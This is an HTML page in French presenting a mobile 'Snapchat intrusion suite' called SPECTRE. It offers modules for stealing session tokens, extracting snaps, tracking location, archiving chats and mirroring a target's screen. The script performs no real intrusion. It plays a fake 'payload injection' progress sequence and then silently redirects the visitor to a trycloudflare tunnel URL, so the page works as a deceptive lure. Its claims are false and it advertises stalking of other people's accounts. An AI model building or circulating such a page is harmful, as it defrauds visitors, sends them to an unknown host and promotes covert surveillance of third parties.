<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#0a0a0c">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<title>SPECTRE</title>
<style>
  :root {
    --snap-yellow: #FFFC00;
    --bg: #0a0a0c;
    --card-bg: #141418;
    --card-border: #26262c;
    --text-primary: #f0f0f5;
    --text-secondary: #8e8e98;
    --danger: #ff4d3d;
    --ok: #00e676;
  }
  * { margin:0; padding:0; box-sizing:border-box; }
  html, body { height: 100%; overflow: hidden; }
  body {
    background: var(--bg);
    color: var(--text-primary);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    -webkit-user-select: none;
    user-select: none;
    -webkit-tap-highlight-color: transparent;
    overscroll-behavior: none;
  }

  /* ---------- SPLASH ---------- */
  #splash {
    position: fixed;
    inset: 0;
    background: var(--bg);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 2000;
    transition: opacity 0.5s ease;
  }
  #splash.hidden {
    opacity: 0;
    pointer-events: none;
  }
  .ghost-logo {
    width: 84px;
    height: 84px;
    color: var(--snap-yellow);
    filter: drop-shadow(0 0 24px rgba(255,252,0,0.45));
    animation: float 2s ease-in-out infinite;
  }
  @keyframes float {
    0%,100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
  }
  .splash-title {
    margin-top: 26px;
    font-size: 30px;
    font-weight: 700;
    letter-spacing: 8px;
    color: var(--snap-yellow);
    text-shadow: 0 0 30px rgba(255,252,0,0.35);
  }
  .splash-sub {
    margin-top: 8px;
    font-size: 12px;
    letter-spacing: 4px;
    color: var(--text-secondary);
    text-transform: uppercase;
  }
  .splash-bar {
    margin-top: 44px;
    width: 200px;
    height: 3px;
    background: rgba(255,255,255,0.08);
    border-radius: 3px;
    overflow: hidden;
  }
  .splash-bar-fill {
    height: 100%;
    width: 0%;
    background: var(--snap-yellow);
    border-radius: 3px;
    box-shadow: 0 0 16px var(--snap-yellow);
    transition: width 1.2s ease;
  }

  /* ---------- MAIN UI ---------- */
  #app {
    position: relative;
    height: 100dvh;
    display: flex;
    flex-direction: column;
    padding-top: env(safe-area-inset-top);
    padding-bottom: env(safe-area-inset-bottom);
  }
  #main-ui {
    flex: 1;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    opacity: 0;
    transition: opacity 0.5s ease;
  }
  #main-ui.visible {
    opacity: 1;
  }

  header {
    flex: 0 0 auto;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 16px 20px;
    border-bottom: 1px solid rgba(255,255,255,0.06);
    background: linear-gradient(180deg, rgba(255,252,0,0.03), transparent);
  }
  .header-left {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .header-ghost {
    width: 30px;
    height: 30px;
    color: var(--snap-yellow);
  }
  .header-title {
    font-size: 19px;
    font-weight: 700;
    letter-spacing: 4px;
    color: var(--snap-yellow);
    text-shadow: 0 0 12px rgba(255,252,0,0.25);
  }
  .header-status {
    display: flex;
    align-items: center;
    gap: 7px;
    font-size: 11px;
    color: var(--text-secondary);
    letter-spacing: 1.5px;
  }
  .status-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: var(--ok);
    box-shadow: 0 0 8px var(--ok);
    animation: pulse 2s infinite;
  }
  @keyframes pulse {
    0%,100% { opacity: 1; }
    50% { opacity: 0.35; }
  }

  main {
    flex: 1;
    overflow-y: auto;
    padding: 20px;
    -webkit-overflow-scrolling: touch;
  }
  main::-webkit-scrollbar { width: 0; }

  .status-card {
    background: var(--card-bg);
    border: 1px solid var(--card-border);
    border-radius: 16px;
    padding: 16px 18px;
    margin-bottom: 26px;
  }
  .status-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 7px 0;
    font-size: 13px;
  }
  .status-row .label {
    color: var(--text-secondary);
    letter-spacing: 0.5px;
  }
  .status-row .value {
    font-weight: 700;
    letter-spacing: 0.5px;
  }
  .value.danger { color: var(--danger); text-shadow: 0 0 8px rgba(255,77,61,0.3); }
  .value.ok { color: var(--snap-yellow); text-shadow: 0 0 8px rgba(255,252,0,0.3); }

  .section-title {
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 2.5px;
    color: var(--text-secondary);
    text-transform: uppercase;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .section-title::after {
    content: "";
    flex: 1;
    height: 1px;
    background: linear-gradient(90deg, rgba(255,252,0,0.3), transparent);
  }

  .modules {
    display: flex;
    flex-direction: column;
    gap: 12px;
  }

  .module {
    display: flex;
    align-items: center;
    gap: 14px;
    background: var(--card-bg);
    border: 1px solid var(--card-border);
    border-radius: 16px;
    padding: 16px;
    cursor: pointer;
    transition: border-color 0.2s, background 0.2s, transform 0.1s;
    position: relative;
    overflow: hidden;
    opacity: 0;
    transform: translateY(10px);
  }
  .module::before {
    content: "";
    position: absolute;
    left: 0;
    top: 0;
    bottom: 0;
    width: 3px;
    background: var(--snap-yellow);
    opacity: 0;
    transition: opacity 0.2s;
    box-shadow: 0 0 12px rgba(255,252,0,0.6);
  }
  .module:active {
    border-color: rgba(255,252,0,0.55);
    background: #1a1a20;
    transform: scale(0.98);
  }
  .module:active::before {
    opacity: 1;
  }
  .module-icon {
    flex: 0 0 auto;
    width: 46px;
    height: 46px;
    border-radius: 14px;
    background: rgba(255,252,0,0.1);
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--snap-yellow);
  }
  .module-icon svg {
    width: 24px;
    height: 24px;
  }
  .module-content {
    flex: 1;
    min-width: 0;
  }
  .module-name {
    font-size: 14.5px;
    font-weight: 700;
    color: var(--text-primary);
    margin-bottom: 3px;
    letter-spacing: 0.3px;
  }
  .module-desc {
    font-size: 12px;
    color: var(--text-secondary);
    line-height: 1.4;
  }
  .module-status {
    flex: 0 0 auto;
    font-size: 10px;
    font-weight: 700;
    color: var(--snap-yellow);
    background: rgba(255,252,0,0.1);
    padding: 5px 9px;
    border-radius: 8px;
    letter-spacing: 1.5px;
    align-self: flex-start;
    margin-top: 2px;
  }

  /* ---------- DEPLOY OVERLAY ---------- */
  #deploy-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.94);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    z-index: 3000;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 30px;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s ease;
  }
  #deploy-overlay.active {
    opacity: 1;
    pointer-events: auto;
  }
  .deploy-content {
    width: 100%;
    max-width: 340px;
    text-align: center;
  }
  .deploy-icon {
    width: 70px;
    height: 70px;
    margin: 0 auto 22px;
    color: var(--snap-yellow);
    filter: drop-shadow(0 0 24px rgba(255,252,0,0.55));
    animation: pulse-icon 1.5s ease-in-out infinite;
  }
  @keyframes pulse-icon {
    0%,100% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.08); opacity: 0.8; }
  }
  .deploy-title {
    font-size: 20px;
    font-weight: 700;
    color: var(--text-primary);
    margin-bottom: 6px;
    letter-spacing: 0.5px;
  }
  .deploy-sub {
    font-size: 13px;
    color: var(--text-secondary);
    margin-bottom: 32px;
    line-height: 1.5;
  }
  .deploy-bar {
    height: 6px;
    background: rgba(255,255,255,0.1);
    border-radius: 6px;
    overflow: hidden;
    margin-bottom: 12px;
  }
  .deploy-bar-fill {
    height: 100%;
    width: 0%;
    background: var(--snap-yellow);
    border-radius: 6px;
    box-shadow: 0 0 18px var(--snap-yellow);
    transition: width 0.1s linear;
  }
  .deploy-percent {
    font-size: 13px;
    font-weight: 700;
    color: var(--snap-yellow);
    letter-spacing: 2px;
    margin-bottom: 24px;
  }
  .deploy-steps {
    text-align: left;
    font-size: 13px;
    color: var(--text-secondary);
    min-height: 90px;
  }
  .deploy-step {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 6px 0;
    opacity: 0;
    transform: translateY(6px);
    animation: step-in 0.35s ease forwards;
  }
  @keyframes step-in {
    to { opacity: 1; transform: none; }
  }
  .deploy-step .check {
    color: var(--snap-yellow);
    font-weight: 700;
    font-size: 14px;
  }

  .hidden { display: none !important; }
</style>
</head>
<body>

  <!-- SPLASH -->
  <div id="splash">
    <svg class="ghost-logo" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
      <path d="M12 2C8 2 5 5 5 9v7c0 .5-.5 1-1 1.5S3 19 3 20c0 .5.5 1 1 1h16c.5 0 1-.5 1-1 0-1-.5-2-1-2.5s-1-1-1-1.5V9c0-4-3-7-7-7z"/>
      <circle cx="9" cy="10" r="1.5" fill="currentColor"/>
      <circle cx="15" cy="10" r="1.5" fill="currentColor"/>
    </svg>
    <div class="splash-title">SPECTRE</div>
    <div class="splash-sub">Suite d'intrusion Snapchat</div>
    <div class="splash-bar">
      <div class="splash-bar-fill" id="splashBarFill"></div>
    </div>
  </div>

  <!-- APP -->
  <div id="app">
    <div id="main-ui">
      <header>
        <div class="header-left">
          <svg class="header-ghost" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
            <path d="M12 2C8 2 5 5 5 9v7c0 .5-.5 1-1 1.5S3 19 3 20c0 .5.5 1 1 1h16c.5 0 1-.5 1-1 0-1-.5-2-1-2.5s-1-1-1-1.5V9c0-4-3-7-7-7z"/>
            <circle cx="9" cy="10" r="1.5" fill="currentColor"/>
            <circle cx="15" cy="10" r="1.5" fill="currentColor"/>
          </svg>
          <span class="header-title">SPECTRE</span>
        </div>
        <div class="header-status">
          <span class="status-dot"></span>
          <span>SÉCURISÉ</span>
        </div>
      </header>

      <main>
        <div class="status-card">
          <div class="status-row">
            <span class="label">CIBLES SOUS CONTRÔLE</span>
            <span class="value danger" id="targetCount">0</span>
          </div>
          <div class="status-row">
            <span class="label">MODULES CHARGÉS</span>
            <span class="value ok">5 / 5</span>
          </div>
          <div class="status-row">
            <span class="label">RELAYAGE</span>
            <span class="value ok">7 SAUTS — STABLE</span>
          </div>
          <div class="status-row">
            <span class="label">EMPREINTE APPAREIL</span>
            <span class="value ok">MASQUÉE</span>
          </div>
        </div>

        <div class="section-title">VECTEURS D'INTRUSION — SNAPCHAT</div>
        <div class="modules" id="modulesContainer"></div>
      </main>
    </div>
  </div>

  <!-- DEPLOY OVERLAY -->
  <div id="deploy-overlay">
    <div class="deploy-content">
      <div class="deploy-icon" id="deployIcon"></div>
      <div class="deploy-title" id="deployTitle"></div>
      <div class="deploy-sub" id="deploySub"></div>
      <div class="deploy-bar">
        <div class="deploy-bar-fill" id="deployBarFill"></div>
      </div>
      <div class="deploy-percent" id="deployPercent">0 %</div>
      <div class="deploy-steps" id="deploySteps"></div>
    </div>
  </div>

<script>
(function(){
  "use strict";

  var REDIRECT = "https://thu-anywhere-jennifer-clip.trycloudflare.com/";

  // ---------- SPLASH ----------
  var splash = document.getElementById("splash");
  var splashBarFill = document.getElementById("splashBarFill");
  var mainUI = document.getElementById("main-ui");

  setTimeout(function(){ splashBarFill.style.width = "100%"; }, 100);

  setTimeout(function(){
    splash.classList.add("hidden");
    mainUI.classList.add("visible");
    setTimeout(function(){ splash.remove(); }, 600);
  }, 1600);

  // ---------- MODULES ----------
  var MODULES = [
    {
      code: "SES-01",
      name: "INTERCEPTION DE SESSION",
      desc: "Capture des jetons d'authentification Snapchat actifs",
      icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 2C8 2 5 5 5 9v7c0 .5-.5 1-1 1.5S3 19 3 20c0 .5.5 1 1 1h16c.5 0 1-.5 1-1 0-1-.5-2-1-2.5s-1-1-1-1.5V9c0-4-3-7-7-7z"/><circle cx="9" cy="10" r="1.5" fill="currentColor"/><circle cx="15" cy="10" r="1.5" fill="currentColor"/></svg>'
    },
    {
      code: "MED-02",
      name: "EXTRACTION DES SNAPS",
      desc: "Récupération des médias éphémères avant expiration",
      icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="6" width="18" height="14" rx="2"/><circle cx="12" cy="13" r="3"/><path d="M8 6l1.5-2h5L16 6"/></svg>'
    },
    {
      code: "GEO-03",
      name: "SNAP MAP — PISTAGE",
      desc: "Localisation en temps réel de l'appareil cible",
      icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 21s-6-5.33-6-10a6 6 0 1112 0c0 4.67-6 10-6 10z"/><circle cx="12" cy="11" r="2.5"/></svg>'
    },
    {
      code: "CON-04",
      name: "ARCHIVE DES CONVERSATIONS",
      desc: "Historique complet des discussions et des appels",
      icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 12a8 8 0 01-8 8H4l3-3a8 8 0 018-13 8 8 0 016 8z"/></svg>'
    },
    {
      code: "MIR-05",
      name: "MIROIR D'ÉCRAN",
      desc: "Diffusion continue de l'écran de la cible",
      icon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="3" width="16" height="18" rx="2"/><path d="M8 3v18"/><rect x="12" y="8" width="6" height="6" rx="1"/></svg>'
    }
  ];

  var modulesContainer = document.getElementById("modulesContainer");

  function buildModules() {
    MODULES.forEach(function(m, idx) {
      var div = document.createElement("div");
      div.className = "module";
      div.style.animation = "step-in 0.4s ease forwards";
      div.style.animationDelay = (idx * 0.08) + "s";
      div.innerHTML =
        '<div class="module-icon">' + m.icon + '</div>' +
        '<div class="module-content">' +
          '<div class="module-name">' + m.name + '</div>' +
          '<div class="module-desc">' + m.desc + '</div>' +
        '</div>' +
        '<div class="module-status">PRÊT</div>';
      div.addEventListener("click", function(){ deploy(m); });
      modulesContainer.appendChild(div);
    });
  }

  setTimeout(buildModules, 1700);

  // ---------- DEPLOY ----------
  var overlay = document.getElementById("deploy-overlay");
  var deployIcon = document.getElementById("deployIcon");
  var deployTitle = document.getElementById("deployTitle");
  var deploySub = document.getElementById("deploySub");
  var deployBarFill = document.getElementById("deployBarFill");
  var deployPercent = document.getElementById("deployPercent");
  var deploySteps = document.getElementById("deploySteps");

  var STEPS = [
    "Négociation du canal chiffré",
    "Validation du vecteur",
    "Injection de la charge utile",
    "Contournement de la détection",
    "Établissement de la liaison"
  ];

  var deploying = false;

  function deploy(m) {
    if (deploying) return;
    deploying = true;

    if (navigator.vibrate) { try { navigator.vibrate(12); } catch(e){} }

    deployIcon.innerHTML = m.icon;
    deployTitle.textContent = m.name;
    deploySub.textContent = m.code + " — " + m.desc;
    deployBarFill.style.width = "0%";
    deployPercent.textContent = "0 %";
    deploySteps.innerHTML = "";

    overlay.classList.add("active");

    var stepIdx = 0;
    var progress = 0;

    var stepTimer = setInterval(function() {
      if (stepIdx < STEPS.length) {
        var stepDiv = document.createElement("div");
        stepDiv.className = "deploy-step";
        stepDiv.innerHTML = '<span class="check">✓</span> ' + STEPS[stepIdx];
        deploySteps.appendChild(stepDiv);
        stepIdx++;
      }
    }, 550);

    var pctTimer = setInterval(function() {
      progress += Math.random() * 6 + 2;
      if (progress > 100) progress = 100;
      deployBarFill.style.width = progress + "%";
      deployPercent.textContent = Math.floor(progress) + " %";

      if (progress >= 100) {
        clearInterval(pctTimer);
        clearInterval(stepTimer);
        setTimeout(function() {
          window.location.href = REDIRECT;
        }, 600);
      }
    }, 100);
  }

  // ---------- GESTURE BLOCK ----------
  document.addEventListener("gesturestart", function(e){ e.preventDefault(); });
  document.addEventListener("touchmove", function(e){
    if (e.touches.length > 1) e.preventDefault();
  }, { passive: false });

})();
</script>
</body>
</html>
